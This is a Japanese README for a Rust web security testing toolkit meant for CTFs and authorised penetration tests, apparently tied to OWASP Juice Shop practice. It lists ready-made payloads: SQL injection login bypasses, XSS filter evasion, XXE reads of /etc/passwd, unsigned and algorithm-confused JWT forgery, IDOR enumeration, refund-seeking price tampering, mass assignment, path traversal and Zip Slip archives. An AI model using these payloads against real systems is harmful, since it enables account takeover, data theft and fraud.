# Web Security Toolkit

Rust製の汎用Webセキュリティテストツールキット。CTF、ペネトレーションテスト、セキュリティ診断に使用できます。

## インストール

```bash
cargo build --release
```

バイナリは `target/release/` に生成されます：
- `encoder` - エンコーディングツール
- `jwt-tool` - JWT操作ツール
- `payload-gen` - ペイロード生成ツール
- `ssrf-scanner` - SSRFスキャナー
- `zip-payload` - Zip Slipペイロード生成
- `web-scanner` - Webスキャナー
- `http-client` - HTTPクライアント

## 使用シーン

### 1. ログイン認証のテスト (SQLi)

SQLインジェクションでログインをバイパスしたい場合：

```bash
# 認証バイパスペイロードを取得
payload-gen sqli auth-bypass

# 出力例:
# OR 1=1              → ' OR 1=1--
# Comment bypass      → admin'--
# Hash comment        → ' OR 1=1#

# 特定ユーザーでログインしたい場合
payload-gen sqli login jim@example.com
# 出力: jim@example.com'--
```

### 2. XSS脆弱性のテスト

入力フィールドでXSSを試したい場合：

```bash
# 基本的なXSSペイロード
payload-gen xss basic

# フィルタバイパスが必要な場合
payload-gen xss bypass

# 出力例:
# Double encoding     → <<script>script>alert('XSS')<</script>/script>
# Case mixing         → <ScRiPt>alert('XSS')</sCrIpT>
```

### 3. XXE攻撃のテスト

XMLアップロード機能がある場合：

```bash
# /etc/passwd を読み取るペイロード
payload-gen xxe file /etc/passwd

# 出力されるXMLをそのままアップロード
```

### 4. JWTトークンの改ざん

JWT認証をバイパスしたい場合：

```bash
# 現在のトークンをデコード
jwt-tool decode "eyJhbGciOiJIUzI1NiIs..."

# 署名なしJWTを生成（alg: none攻撃）
jwt-tool unsigned '{"data":{"email":"admin@example.com","role":"admin"}}'

# アルゴリズム混乱攻撃（RS256 → HS256）
jwt-tool hs256 '{"role":"admin"}' "公開鍵の内容"
```

### 5. IDOR（権限昇格）のテスト

他のユーザーのリソースにアクセスしたい場合：

```bash
# IDの変動パターンを生成
payload-gen idor ids 5 10
# 出力: 1, 2, 3, 4, 6, 7, 8, ... などのIDリスト

# よくあるIDORエンドポイント
payload-gen idor endpoints
```

### 6. パラメータ改ざんのテスト

APIリクエストを改ざんしたい場合：

```bash
# 負の値のテスト（料金計算などに有効）
payload-gen tampering negative quantity 1

# 出力例:
# Original: {"quantity":1}
# Tampered: {"quantity":-100}  ← 負の数量で返金を狙う

# Mass Assignment攻撃
payload-gen tampering mass-assignment

# 出力例:
# Original: {"email":"test@test.com"}
# Tampered: {"email":"test@test.com","role":"admin"}
```

### 7. セキュリティヘッダーの診断

Webサイトのセキュリティヘッダーをチェック：

```bash
# ヘッダーチェック（実際のサイトに対して実行）
web-scanner check-headers https://example.com

# 推奨ヘッダーを確認
web-scanner recommended-headers
```

### 8. Cookieのセキュリティチェック

```bash
web-scanner check-cookies https://example.com

# Secure, HttpOnly, SameSite属性をチェック
```

### 9. CORSの設定ミスを検出

```bash
web-scanner test-cors https://api.example.com --origin https://evil.com

# オリジン反射やワイルドカード設定を検出
```

### 10. パストラバーサル

ファイルアクセス制限をバイパスしたい場合：

```bash
# 様々なエンコードのペイロードを生成
payload-gen traversal 5 etc/passwd

# Null Byte攻撃を含むバリエーション
```

### 11. エンコーディング

```bash
# Juice Shopのクーポンコード生成（Z85エンコード）
encoder juice-coupon JAN 26 90
# Coupon: JAN26-90
# Z85: n<Michz3{y

# 各種エンコード
encoder encode base64 "secret"
encoder encode hex "data"
encoder decode z85 "encoded"
encoder rot13 "text"
```

### 12. Zip Slip攻撃

```bash
# カスタムZip Slipペイロード
zip-payload create -o exploit.zip -t "../../etc/passwd" -c "content"

# よくあるターゲットを確認
zip-payload list
```

## ライブラリとしての使用

```rust
use web_security_toolkit::*;

// SQLiペイロード
let payloads = juice_shop_sqli();

// JWT生成
let token = create_unsigned_jwt(&json!({"role": "admin"}));

// セキュリティヘッダー分析
let checks = analyze_headers(&response_headers);

// IDOR ID生成
let ids = generate_id_variations(5, 10);

// パラメータ改ざん
let tests = negative_value_tests("quantity", 1);
```

## テスト

```bash
cargo test
# 69 tests + 12 doc tests
```

## 注意事項

- このツールは**許可されたシステム**に対してのみ使用してください
- CTF、ペネトレーションテスト、自社システムの診断に限定
- 不正アクセスは犯罪です
